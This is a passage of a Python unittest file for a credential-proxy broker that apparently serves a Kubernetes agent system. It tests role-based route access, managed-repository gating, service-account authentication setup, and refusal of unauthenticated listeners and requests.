            with self.subTest(path=path):
                handler, principal = self._handler(path, "")
                self.assertTrue(handler._role_permits(principal))
                self.assertEqual([], handler.replies)

    def test_the_session_reaches_exec_and_nothing_else(self):
        handler, principal = self._handler("/v1/exec", credential_proxy.CALLER_ROLE_SESSION)
        self.assertTrue(handler._role_permits(principal))
        self.assertEqual([], handler.replies)
        for path in (
            "/v1/vcs/probe", "/v1/workspace/open", "/v1/forge/refresh", "/v1/github/refresh",
            credential_proxy.API_RELAY_PREFIX + "monitoring.googleapis.com/v3/x",
            "/v1/chat/slack/api", "/v1/chat/api", "/v1/chat/a2a/events",
        ):
            with self.subTest(path=path):
                handler, principal = self._handler(path, credential_proxy.CALLER_ROLE_SESSION)
                with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
                    self.assertFalse(handler._role_permits(principal))
                status, payload = handler.replies[0]
                self.assertEqual(HTTPStatus.FORBIDDEN, status)
                self.assertEqual("CALLER_ROLE_FORBIDDEN", payload["code"])


class CredentialReachTest(unittest.TestCase):
    """The startup diagnostic for a token that reaches further than the install."""

    def _broker(self, answer):
        forge = mock.Mock(hosts=("gitlab.example.com",))
        forge.name = "gitlab"
        broker = mock.Mock()
        broker.registry.forges = [forge]
        if isinstance(answer, Exception):
            broker.credential_reach.side_effect = answer
        else:
            broker.credential_reach.return_value = answer
        return broker

    def test_unmanaged_repositories_the_token_reaches_are_named(self):
        broker = self._broker((["acme/infra", "acme/payroll", "team/secret"], False))
        with mock.patch.object(
            credential_proxy, "managed_repositories",
            return_value=frozenset({"gitlab:gitlab.example.com/acme/infra"}),
        ), self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            credential_proxy.warn_on_credential_reach(broker)
        line = "\n".join(logs.output)
        self.assertIn("reaches 2 repositories this install does not manage", line)
        self.assertIn("acme/payroll, team/secret", line)
        self.assertNotIn("acme/infra,", line)

    def test_a_token_that_reaches_only_managed_repositories_is_quiet(self):
        broker = self._broker((["acme/infra"], False))
        with mock.patch.object(
            credential_proxy, "managed_repositories",
            return_value=frozenset({"gitlab:gitlab.example.com/acme/infra"}),
        ), self.assertNoLogs(credential_proxy.LOGGER, level="WARNING"):
            credential_proxy.warn_on_credential_reach(broker)

    def test_a_token_that_reaches_nothing_is_named_not_reassured(self):
        # Review: an empty membership logged "reaches 0 repositories, all of
        # them managed" at INFO, for a token that cannot reach the managed
        # repositories either.
        with mock.patch.object(
            credential_proxy, "managed_repositories",
            return_value=frozenset({"gitlab:gitlab.example.com/acme/infra"}),
        ), self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            credential_proxy.warn_on_credential_reach(self._broker(([], False)))
        self.assertIn("reaches no repositories at all", "\n".join(logs.output))

    def test_an_all_managed_count_cut_short_says_at_least(self):
        # Review: the "at least" the unmanaged branch carries was dropped on
        # the all-managed one, the branch that reassures.
        with mock.patch.object(
            credential_proxy, "managed_repositories",
            return_value=frozenset({"gitlab:gitlab.example.com/acme/infra"}),
        ), self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            credential_proxy.warn_on_credential_reach(self._broker((["acme/infra"], True)))
        self.assertIn("reaches at least 1 repositories, all of them managed", "\n".join(logs.output))

    def test_an_unreachable_forge_logs_the_reason_not_only_the_type(self):
        # Review round 2: a TLS or DNS failure logged as `type=WorkspaceError`
        # alone left the operator nothing to act on.
        refusal = providers.WorkspaceError(
            "x", status=502, code="FORGE_CALL_FAILED",
            detail="the forge's TLS certificate is not trusted by this image",
        )
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            credential_proxy.warn_on_credential_reach(self._broker(refusal))
        self.assertIn("TLS certificate is not trusted", "\n".join(logs.output))

    def test_a_missing_token_logs_its_reason_and_code(self):
        # Review (#2439): the token-file refusal carries no detail, and the
        # log line read `type=WorkspaceError` alone for the routine case of
        # a Secret not mounted yet.
        refusal = providers.WorkspaceError(
            "the forge credential for gitlab.com could not be read: FileNotFoundError",
            status=503, code="FORGE_CREDENTIAL_UNAVAILABLE",
        )
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            credential_proxy.warn_on_credential_reach(self._broker(refusal))
        out = "\n".join(logs.output)
        self.assertIn("FORGE_CREDENTIAL_UNAVAILABLE", out)
        self.assertIn("could not be read: FileNotFoundError", out)

    def test_a_forge_that_cannot_say_or_cannot_answer_never_raises(self):
        credential_proxy.warn_on_credential_reach(self._broker(None))
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            credential_proxy.warn_on_credential_reach(self._broker(RuntimeError("down")))
        self.assertIn("could not ask what the gitlab credential", "\n".join(logs.output))


class ManagedRepositoryGateTest(unittest.TestCase):
    """The broker answers "is this a repository we act on" for itself."""

    def _handler(self):
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.replies = []
        handler._json = lambda status, payload: handler.replies.append((status, payload))
        return handler

    def test_a_registration_on_one_forge_does_not_admit_the_same_path_on_another(self):
        # Two forges can each have an `acme/infra`; the key carries the
        # provider and the host.
        github = mock.Mock(hosts=("github.com",))
        github.name = "github"
        other = mock.Mock(hosts=("git.example.test",))
        other.name = "gitlab"
        with mock.patch.object(
            credential_proxy, "managed_repositories",
            return_value=frozenset({"github:github.com/acme/infra"}),
        ):
            self.assertTrue(credential_proxy.repository_is_managed("acme/infra", github))
            self.assertFalse(credential_proxy.repository_is_managed("acme/infra", other))

    def test_an_entry_typed_for_another_provider_admits_nothing_on_this_one(self):
        # Review finding: keyed by host alone, a `managed_repos` entry typed
        # `GitHub` or `gitlab` but naming github.com passed the gate, and the
        # refresh minted a write token for it. Only `type: github` ever counted.
        import gitops_workspace

        github = mock.Mock(hosts=("github.com",))
        github.name = "github"
        entries = [
            {"type": "GitHub", "url": "https://github.com/acme/secret"},
            {"type": "gitlab", "url": "https://github.com/acme/other"},
        ]
        with mock.patch.object(gitops_workspace, "get_managed_repo_entries", return_value=entries), \
                mock.patch.object(credential_proxy, "_managed_repository_cache", None):
            self.assertFalse(credential_proxy.repository_is_managed("acme/secret", github))
            self.assertFalse(credential_proxy.repository_is_managed("acme/other", github))

    def test_a_provider_this_install_did_not_build_is_refused_not_defaulted(self):
        # Review finding: an unknown provider used to fall back to the one
        # forge's list.
        executor = CommandExecutor.__new__(CommandExecutor)
        with mock.patch.object(executor, "_forge_helper", return_value="/x"), \
                mock.patch.object(
                    credential_proxy, "managed_repositories",
                    return_value=frozenset({"github:github.com/acme/infra"}),
                ):
            with self.assertRaises(PermissionError):
                executor.refresh_forge_credential("gitlab", "acme/infra")

    def test_a_bare_path_with_no_one_forge_to_mean_is_refused_as_unreadable(self):
        handler = self._handler()
        registry = mock.Mock(default=None)
        with mock.patch.object(credential_proxy, "forge_registry", return_value=registry), \
                mock.patch.object(
                    credential_proxy, "managed_repositories",
                    return_value=frozenset({"github:github.com/acme/infra"}),
                ), self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
            self.assertFalse(handler._repository_is_permitted("acme/infra"))
        status, payload = handler.replies[0]
        self.assertEqual(HTTPStatus.SERVICE_UNAVAILABLE, status)
        self.assertEqual("MANAGED_REPOSITORIES_UNAVAILABLE", payload["code"])

    def test_a_managed_repository_passes_silently(self):
        handler = self._handler()
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True):
            self.assertTrue(handler._repository_is_permitted("gke-labs/kube-agents"))
        self.assertEqual([], handler.replies)

    def test_an_unmanaged_repository_is_refused(self):
        handler = self._handler()
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=False):
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
                self.assertFalse(handler._repository_is_permitted("attacker/exfil"))
        status, payload = handler.replies[0]
        self.assertEqual(HTTPStatus.FORBIDDEN, status)
        self.assertEqual("REPOSITORY_NOT_MANAGED", payload["code"])

    def test_an_unreadable_list_refuses_rather_than_allows(self):
        # Fail closed: the alternative spends the installation token on a
        # repository nobody has said the agent manages.
        handler = self._handler()
        with mock.patch.object(
            credential_proxy, "repository_is_managed", side_effect=RuntimeError("no kubectl")
        ):
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
                self.assertFalse(handler._repository_is_permitted("gke-labs/kube-agents"))
        status, payload = handler.replies[0]
        self.assertEqual(HTTPStatus.SERVICE_UNAVAILABLE, status)
        self.assertEqual("MANAGED_REPOSITORIES_UNAVAILABLE", payload["code"])

    def test_the_comparison_ignores_case(self):
        with mock.patch.object(
            credential_proxy, "managed_repositories", return_value=frozenset({"github:github.com/gke-labs/kube-agents"})
        ):
            self.assertTrue(credential_proxy.repository_is_managed("GKE-Labs/Kube-Agents"))
            self.assertFalse(credential_proxy.repository_is_managed("gke-labs/other"))


class BuildAuthenticatorTest(unittest.TestCase):
    def test_the_a2a_chat_audience_confers_its_own_role(self):
        environment = {
            "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
            "CREDENTIAL_PROXY_ALLOWED_CALLERS": "system:serviceaccount:ns:agent",
            "KUBERNETES_SERVICE_HOST": "10.0.0.1",
            "CREDENTIAL_PROXY_CHAT_AUDIENCE": "aud-chat",
            "CREDENTIAL_PROXY_A2A_CHAT_AUDIENCE": "aud-a2a",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            authenticator = credential_proxy.build_authenticator()
        self.assertEqual(
            authenticator.audience_roles,
            {
                credential_proxy.DEFAULT_CREDENTIAL_PROXY_AUDIENCE: credential_proxy.CALLER_ROLE_SHELL,
                "aud-chat": credential_proxy.CALLER_ROLE_CHAT,
                "aud-a2a": credential_proxy.CALLER_ROLE_A2A_CHAT,
            },
        )

    def test_the_a2a_chat_audience_means_nothing_without_the_chat_split(self):
        # And says so: a gateway presenting that audience would otherwise 401
        # with "audience not known" and nothing naming the env.
        environment = {
            "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
            "CREDENTIAL_PROXY_ALLOWED_CALLERS": "system:serviceaccount:ns:agent",
            "KUBERNETES_SERVICE_HOST": "10.0.0.1",
            "CREDENTIAL_PROXY_A2A_CHAT_AUDIENCE": "aud-a2a",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
                authenticator = credential_proxy.build_authenticator()
        self.assertEqual(
            authenticator.audience_roles, {credential_proxy.DEFAULT_CREDENTIAL_PROXY_AUDIENCE: ""}
        )
        self.assertTrue(any("CREDENTIAL_PROXY_A2A_CHAT_AUDIENCE" in line for line in logs.output))

    def test_an_a2a_chat_audience_equal_to_the_chat_audience_is_refused_with_a_warning(self):
        environment = {
            "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
            "CREDENTIAL_PROXY_ALLOWED_CALLERS": "system:serviceaccount:ns:agent",
            "KUBERNETES_SERVICE_HOST": "10.0.0.1",
            "CREDENTIAL_PROXY_CHAT_AUDIENCE": "aud-chat",
            "CREDENTIAL_PROXY_A2A_CHAT_AUDIENCE": "aud-chat",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
                authenticator = credential_proxy.build_authenticator()
        self.assertNotIn(credential_proxy.CALLER_ROLE_A2A_CHAT, authenticator.audience_roles.values())
        self.assertTrue(any("CREDENTIAL_PROXY_A2A_CHAT_AUDIENCE" in line for line in logs.output))

    def test_the_default_is_the_null_authenticator(self):
        with mock.patch.dict(os.environ, {}, clear=True):
            self.assertIsInstance(
                credential_proxy.build_authenticator(), credential_proxy.NullAuthenticator
            )

    def test_serviceaccount_mode_needs_an_allowlist(self):
        environment = {
            "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
            "KUBERNETES_SERVICE_HOST": "10.0.0.1",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            with self.assertRaises(RuntimeError):
                credential_proxy.build_authenticator()

    def test_serviceaccount_mode_needs_an_api_server(self):
        environment = {
            "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
            "CREDENTIAL_PROXY_ALLOWED_CALLERS": "system:serviceaccount:ns:agent",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            with self.assertRaises(ValueError):
                credential_proxy.build_authenticator()

    def test_an_unknown_mode_is_refused_rather_than_ignored(self):
        # A typo must not silently degrade to "no authentication".
        with mock.patch.dict(
            os.environ, {"CREDENTIAL_PROXY_AUTH_MODE": "servicaccount"}, clear=True
        ):
            with self.assertRaises(RuntimeError):
                credential_proxy.build_authenticator()

    def test_serviceaccount_mode_builds_the_verifier(self):
        environment = {
            "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
            "CREDENTIAL_PROXY_ALLOWED_CALLERS": "system:serviceaccount:ns:agent, ",
            "KUBERNETES_SERVICE_HOST": "10.0.0.1",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            authenticator = credential_proxy.build_authenticator()
        self.assertIsInstance(authenticator, credential_proxy.ServiceAccountAuthenticator)
        self.assertEqual(
            frozenset({"system:serviceaccount:ns:agent"}), authenticator.allowed_callers
        )
        # No CREDENTIAL_PROXY_CHAT_AUDIENCE in the environment, so one audience
        # carrying no role: an older operator's broker must not 403 the gateway.
        self.assertEqual({"kubeagents-credential-proxy": ""}, authenticator.audience_roles)

    def test_a_chat_audience_splits_the_two_callers_by_role(self):
        environment = {
            "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
            "CREDENTIAL_PROXY_ALLOWED_CALLERS": "system:serviceaccount:ns:agent",
            "CREDENTIAL_PROXY_CHAT_AUDIENCE": "kubeagents-credential-proxy-chat",
            "KUBERNETES_SERVICE_HOST": "10.0.0.1",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            authenticator = credential_proxy.build_authenticator()
        self.assertEqual(
            {
                "kubeagents-credential-proxy": credential_proxy.CALLER_ROLE_SHELL,
                "kubeagents-credential-proxy-chat": credential_proxy.CALLER_ROLE_CHAT,
            },
            authenticator.audience_roles,
        )

    def test_a_chat_audience_equal_to_the_shell_one_is_not_a_split(self):
        # Setting both to the same string cannot separate anything, and taking
        # it at face value would map one audience onto two roles.
        environment = {
            "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
            "CREDENTIAL_PROXY_ALLOWED_CALLERS": "system:serviceaccount:ns:agent",
            "CREDENTIAL_PROXY_CHAT_AUDIENCE": "kubeagents-credential-proxy",
            "KUBERNETES_SERVICE_HOST": "10.0.0.1",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            authenticator = credential_proxy.build_authenticator()
        self.assertEqual({"kubeagents-credential-proxy": ""}, authenticator.audience_roles)

    def test_the_session_audience_confers_its_own_role(self):
        environment = {
            "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
            "CREDENTIAL_PROXY_ALLOWED_CALLERS": "system:serviceaccount:ns:agent",
            "KUBERNETES_SERVICE_HOST": "10.0.0.1",
            "CREDENTIAL_PROXY_CHAT_AUDIENCE": "aud-chat",
            "CREDENTIAL_PROXY_SESSION_AUDIENCE": "aud-session",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            authenticator = credential_proxy.build_authenticator()
        self.assertEqual(
            authenticator.audience_roles,
            {
                credential_proxy.DEFAULT_CREDENTIAL_PROXY_AUDIENCE: credential_proxy.CALLER_ROLE_SHELL,
                "aud-chat": credential_proxy.CALLER_ROLE_CHAT,
                "aud-session": credential_proxy.CALLER_ROLE_SESSION,
            },
        )

    def test_the_session_audience_means_nothing_without_the_chat_split(self):
        environment = {
            "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
            "CREDENTIAL_PROXY_ALLOWED_CALLERS": "system:serviceaccount:ns:agent",
            "KUBERNETES_SERVICE_HOST": "10.0.0.1",
            "CREDENTIAL_PROXY_SESSION_AUDIENCE": "aud-session",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
                authenticator = credential_proxy.build_authenticator()
        self.assertEqual(
            authenticator.audience_roles, {credential_proxy.DEFAULT_CREDENTIAL_PROXY_AUDIENCE: ""}
        )
        self.assertTrue(any("CREDENTIAL_PROXY_SESSION_AUDIENCE" in line for line in logs.output))

    def test_a_session_audience_equal_to_another_is_refused_with_a_warning(self):
        for clash in (credential_proxy.DEFAULT_CREDENTIAL_PROXY_AUDIENCE, "aud-chat"):
            environment = {
                "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
                "CREDENTIAL_PROXY_ALLOWED_CALLERS": "system:serviceaccount:ns:agent",
                "KUBERNETES_SERVICE_HOST": "10.0.0.1",
                "CREDENTIAL_PROXY_CHAT_AUDIENCE": "aud-chat",
                "CREDENTIAL_PROXY_SESSION_AUDIENCE": clash,
            }
            with self.subTest(clash=clash):
                with mock.patch.dict(os.environ, environment, clear=True):
                    with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
                        authenticator = credential_proxy.build_authenticator()
                self.assertNotIn(credential_proxy.CALLER_ROLE_SESSION, authenticator.audience_roles.values())
                self.assertTrue(any("CREDENTIAL_PROXY_SESSION_AUDIENCE" in line for line in logs.output))

    def test_the_session_callers_are_read_from_the_environment(self):
        environment = {
            "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
            "CREDENTIAL_PROXY_ALLOWED_CALLERS": "system:serviceaccount:ns:agent,system:serviceaccount:ns:agent-a2a-session",
            "KUBERNETES_SERVICE_HOST": "10.0.0.1",
            "CREDENTIAL_PROXY_CHAT_AUDIENCE": "aud-chat",
            "CREDENTIAL_PROXY_SESSION_AUDIENCE": "aud-session",
            "CREDENTIAL_PROXY_SESSION_CALLERS": " system:serviceaccount:ns:agent-a2a-session , ",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            authenticator = credential_proxy.build_authenticator()
        self.assertEqual(
            frozenset({"system:serviceaccount:ns:agent-a2a-session"}),
            authenticator.session_callers,
        )

    def test_a_session_audience_without_session_callers_warns(self):
        environment = {
            "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
            "CREDENTIAL_PROXY_ALLOWED_CALLERS": "system:serviceaccount:ns:agent",
            "KUBERNETES_SERVICE_HOST": "10.0.0.1",
            "CREDENTIAL_PROXY_CHAT_AUDIENCE": "aud-chat",
            "CREDENTIAL_PROXY_SESSION_AUDIENCE": "aud-session",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
                authenticator = credential_proxy.build_authenticator()
        self.assertEqual(frozenset(), authenticator.session_callers)
        self.assertTrue(any("CREDENTIAL_PROXY_SESSION_CALLERS" in line for line in logs.output))


class ServeRefusesAnUnauthenticatedTCPListenerTest(unittest.TestCase):
    """The listener that would hand the credentials to whoever reaches the port.

    The TCP branch of `serve` has always been live code — it is unused only
    because one environment variable is set. Splitting the broker into its own
    Pod is what makes that branch the deployed one, so it must not be reachable
    without an authenticator.
    """

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.policy_path = Path(self.tmp.name) / "policy.json"
        self.policy_path.write_text(json.dumps({"rules": []}), encoding="utf-8")

    def _args(self, unix_socket=""):
        return types.SimpleNamespace(
            policy=str(self.policy_path),
            host="127.0.0.1",
            port=0,
            unix_socket=unix_socket,
            timeout_seconds=5,
            max_request_bytes=1 << 20,
            max_output_bytes=1 << 20,
            state_dir=str(Path(self.tmp.name) / "state"),
        )

    def test_tcp_with_no_authentication_refuses_to_start(self):
        class Bound(Exception):
            """Raised if serve gets as far as binding anything at all."""

        def refuse_to_bind(*args, **kwargs):
            raise Bound

        class FakeThread:
            def __init__(self, *args, **kwargs):
                pass

            def start(self):
                pass

        environment = {"API_SERVER_EXTERNAL_KEY": "external"}
        # Everything that could listen is replaced, so removing the guard makes
        # this test fail loudly instead of blocking on a real serve_forever.
        with mock.patch.dict(os.environ, environment, clear=True), \
                mock.patch.object(credential_proxy, "ThreadingTCPHTTPServer", refuse_to_bind), \
                mock.patch.object(credential_proxy, "ThreadingUnixHTTPServer", refuse_to_bind), \
                mock.patch.object(credential_proxy.threading, "Thread", FakeThread):
            with self.assertRaises(RuntimeError) as raised:
                credential_proxy.serve(self._args())
        self.assertIn("CREDENTIAL_PROXY_AUTH_MODE", str(raised.exception))

    def test_a_unix_socket_behind_a_networked_envoy_also_refuses(self):
        # The deployed split keeps the Unix socket and moves Envoy's listener
        # to the Pod IP. The socket's 0600 mode protects nothing then: the
        # connection arrives through Envoy, as Envoy's own user.
        class Bound(Exception):
            pass

        def refuse_to_bind(*args, **kwargs):
            raise Bound

        class FakeThread:
            def __init__(self, *args, **kwargs):
                pass

            def start(self):
                pass

        environment = {
            "API_SERVER_EXTERNAL_KEY": "external",
            "CREDENTIAL_PROXY_ENVOY_ADDRESS": "0.0.0.0",
        }
        with mock.patch.dict(os.environ, environment, clear=True), \
                mock.patch.object(credential_proxy, "ThreadingTCPHTTPServer", refuse_to_bind), \
                mock.patch.object(credential_proxy, "ThreadingUnixHTTPServer", refuse_to_bind), \
                mock.patch.object(credential_proxy.threading, "Thread", FakeThread):
            with self.assertRaises(RuntimeError) as raised:
                credential_proxy.serve(
                    self._args(unix_socket=str(Path(self.tmp.name) / "backend.sock"))
                )
        self.assertIn("CREDENTIAL_PROXY_AUTH_MODE", str(raised.exception))

    def test_a_unix_socket_behind_a_loopback_envoy_is_the_sidecar_and_is_allowed(self):
        self.assertFalse(
            credential_proxy.reachable_off_pod(self._args(unix_socket="/run/backend.sock"))
        )

    def test_tcp_with_an_authenticator_is_allowed(self):
        owner = self

        class _Stop(Exception):
            pass

        class FakeServer:
            def __init__(self, address, handler):
                self.address = address

            def serve_forever(self):
                raise _Stop

        class FakeThread:
            def __init__(self, *args, **kwargs):
                pass

            def start(self):
                pass

        environment = {
            "API_SERVER_EXTERNAL_KEY": "external",
            "CREDENTIAL_PROXY_AUTH_MODE": "serviceaccount",
            "CREDENTIAL_PROXY_ALLOWED_CALLERS": "system:serviceaccount:ns:agent",
            "KUBERNETES_SERVICE_HOST": "10.0.0.1",
            "CREDENTIAL_PROXY_SCOPED_SA_POOL": "0",
        }
        original = CredentialProxyHandler.__dict__.get("authenticator")
        try:
            with mock.patch.dict(os.environ, environment, clear=True), \
                    mock.patch.object(credential_proxy, "ThreadingTCPHTTPServer", FakeServer), \
                    mock.patch.object(credential_proxy.threading, "Thread", FakeThread):
                with self.assertRaises(_Stop):
                    credential_proxy.serve(self._args())
            self.assertIsInstance(
                CredentialProxyHandler.authenticator,
                credential_proxy.ServiceAccountAuthenticator,
            )
        finally:
            if original is not None:
                CredentialProxyHandler.authenticator = original
        del owner


class AuthenticationOverTheSocketTest(unittest.TestCase):
    """An unauthenticated request must die at the socket, not at a function.

    Deleting the `_authenticated()` call from `do_POST` leaves every unit test
    of the verifier green while the broker answers anyone. This drives a real
    HTTP server with a real authenticator wired onto the handler class.
    """

    CALLER = "system:serviceaccount:kubeagents-system:agent"

    class _RecordingExecutor:
        ALLOWED_EXECUTABLES = CommandExecutor.ALLOWED_EXECUTABLES

        def __init__(self):
            self.executed = []

        def git_lease_violation(self, argv, cwd):
            return None

        def execute(
            self,
            argv,
            stdin=None,
            cwd=None,
            kubeconfig_context=None,
            wants_kubeconfig=False,
            caller=None,
        ):
            self.executed.append(argv)
            return credential_proxy.ExecutionResult(
                exit_code=0, stdout="", stderr="",
                duration_ms=0, truncated=False, timed_out=False,
            )

    def setUp(self):
        self.executor = self._RecordingExecutor()
        for attribute in (
            "policy", "executor", "enforce_read_only", "max_request_bytes", "authenticator",
        ):
            self.addCleanup(
                self._restore,
                attribute,
                attribute in CredentialProxyHandler.__dict__,
                CredentialProxyHandler.__dict__.get(attribute),
            )
        CredentialProxyHandler.executor = self.executor
        CredentialProxyHandler.policy = Policy(rules=[], blocked_message="blocked")
        CredentialProxyHandler.max_request_bytes = 1 << 20
        CredentialProxyHandler.enforce_read_only = True

        authenticator = credential_proxy.ServiceAccountAuthenticator(
            audience_roles={"kubeagents-credential-proxy": ""},
            allowed_callers=frozenset({self.CALLER}),
            api_host="10.0.0.1",
            api_port="443",
            ca_file="",
            token_file="/nonexistent",
            cache_seconds=0.0,
        )
        caller = self.CALLER

        def fake_review(token):
            if token != "good-token":
                raise credential_proxy.AuthenticationError("not our token")
            return credential_proxy.Principal(workload=caller, uid="sa-uid")

        authenticator._review = fake_review
        CredentialProxyHandler.authenticator = authenticator

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), CredentialProxyHandler)
        self.endpoint = f"http://127.0.0.1:{self.server.server_address[1]}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.addCleanup(self.server.server_close)
        self.addCleanup(self.server.shutdown)

    @staticmethod
    def _restore(attribute, was_set, original):
        if was_set:
            setattr(CredentialProxyHandler, attribute, original)
        elif attribute in CredentialProxyHandler.__dict__:
            delattr(CredentialProxyHandler, attribute)

    def _post(self, path="/v1/exec", token=None):
        headers = {"Content-Type": "application/json"}
        if token is not None:
            headers["Authorization"] = f"Bearer {token}"
        request = urllib.request.Request(
            self.endpoint + path,
            data=json.dumps(
                {"requestId": "t", "argv": ["kubectl", "get", "pods"], "cwd": "/tmp"}
            ).encode(),
            headers=headers,
            method="POST",
        )
        try:
            with urllib.request.urlopen(request) as response:
                return response.status, json.load(response)
        except urllib.error.HTTPError as exc:
            return exc.code, json.load(exc)

    def test_an_unauthenticated_exec_is_401_and_runs_nothing(self):
        status, payload = self._post()
        self.assertEqual(401, status)
        self.assertEqual([], self.executor.executed)
        # The 401 must not explain itself; that would be a hint sheet.
        self.assertNotIn("audience", json.dumps(payload))

    def test_a_forged_token_is_401_and_runs_nothing(self):
        status, _ = self._post(token="forged")
        self.assertEqual(401, status)
        self.assertEqual([], self.executor.executed)

    def test_a_verified_token_reaches_the_executor(self):
        status, _ = self._post(token="good-token")
        self.assertEqual(200, status)
        self.assertEqual([["kubectl", "get", "pods"]], self.executor.executed)

    def test_the_github_refresh_route_is_authenticated_too(self):
        status, _ = self._post(path="/v1/github/refresh")
        self.assertEqual(401, status)

    def test_the_chat_relay_route_is_authenticated_too(self):
        status, _ = self._post(path="/v1/chat/events/ack")
        self.assertEqual(401, status)

    def test_healthz_stays_open_for_the_readiness_probe(self):
        with urllib.request.urlopen(self.endpoint + "/healthz") as response:
            self.assertEqual(200, response.status)

    def test_an_unauthenticated_get_on_a_relay_route_is_401(self):
        request = urllib.request.Request(self.endpoint + "/v1/chat/events", method="GET")
        with self.assertRaises(urllib.error.HTTPError) as raised:
            urllib.request.urlopen(request)
        self.assertEqual(401, raised.exception.code)


class ScopedServiceAccountPathTest(unittest.TestCase):
    """The pool as the broker actually reaches it, not as a unit.

    `test_scoped_sa_pool.py` covers selection and refusal in isolation. What is
    left, and what a mutation run showed the unit tests could not see, is the
    join: that a proxied `kubectl` is really handed the scoped credential, and
    that no path through `execute` reaches a cluster without going past
    selection first. Both are asserted against a real subprocess reading a real
    file, because the failure mode here is a command that runs perfectly well on
    the wrong identity.

    The pool is keyed on the project, so "mapped" and "unmapped" are properties
    of the project a cluster is in: `MAPPED` lives in `PROJECT`, which has a
    member, and `UNMAPPED` lives in `OTHER_PROJECT`, which does not. `project_of`
    is the one place that split is spelled, and `agent_context` and
    `ambient_kubeconfig` both go through it.
    """

    PROJECT = "kagents-dev"
    OTHER_PROJECT = "kagents-other"
    LOCATION = "us-east4"
    MAPPED = "mapped-cluster"
    UNMAPPED = "unmapped-cluster"
    EMAIL = "ka-kagents-dev-1a2b3c4d@kagents-host.iam.gserviceaccount.com"
    OTHER_EMAIL = "ka-kagents-other-99887766@kagents-host.iam.gserviceaccount.com"

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        self.minted = []
        # The stubbed `gcloud container clusters get-credentials` appends the
        # context it was asked for here. Selection has to happen before that
        # call, so for a refused cluster this file must stay empty -- and an
        # assertion that only checks the exception passes with the two swapped.
        self.get_credentials_log = Path(self.temp_dir.name) / "get-credentials.log"

    def gke_calls(self):
        if not self.get_credentials_log.exists():
            return []
        return self.get_credentials_log.read_text(encoding="utf-8").split()

    def project_of(self, cluster):
        """Which project a test cluster lives in; the unmapped one is elsewhere."""
        return self.OTHER_PROJECT if cluster == self.UNMAPPED else self.PROJECT

    def pool(self, *, projects=(PROJECT,)):
        import scoped_sa_pool

        emails = {self.PROJECT: self.EMAIL, self.OTHER_PROJECT: self.OTHER_EMAIL}
        members = scoped_sa_pool.parse_pool(
            {
                "version": 2,
                "serviceAccounts": [
                    {"projectId": project, "serviceAccountEmail": emails[project]}
                    for project in projects
                ],
            }
        )

        def minter(account, lifetime):
            self.minted.append(account)
            return f"TOKEN-{len(self.minted)}", 1_000_000.0

        return scoped_sa_pool.ScopedServiceAccountPool(
            members, minter=minter, clock=lambda: 0.0
        )

    def executor(self, scoped_pool):
        executor = CommandExecutor(
            timeout_seconds=30,
            max_output_bytes=1 << 16,
            state_dir=str(Path(self.temp_dir.name) / "state"),
            scoped_pool=scoped_pool,
        )
        executor.environment["GET_CREDENTIALS_LOG"] = str(self.get_credentials_log)
        self.fake_gcloud(executor)
        self.fake_kubectl(executor)
        return executor

    def ambient_kubeconfig(self, executor, cluster):
        """Point the sidecar's own KUBECONFIG at a cluster.

        Not the agent's file -- this is the one `bootstrap` would have had
        gcloud write. Several assertions below only mean what they say when the
        ambient cluster and the requested cluster differ.
        """
        managed = Path(executor.environment["KUBECONFIG"])
        managed.parent.mkdir(parents=True, exist_ok=True)
        managed.write_text(
            "apiVersion: v1\nkind: Config\n"
            f"current-context: gke_{self.project_of(cluster)}_{self.LOCATION}_{cluster}\n",
            encoding="utf-8",
        )
        return managed

    def fake_gcloud(self, executor):
        """A `get-credentials` that writes what the real one writes.

        The exec stanza is the point: it is what makes the unmodified kubeconfig
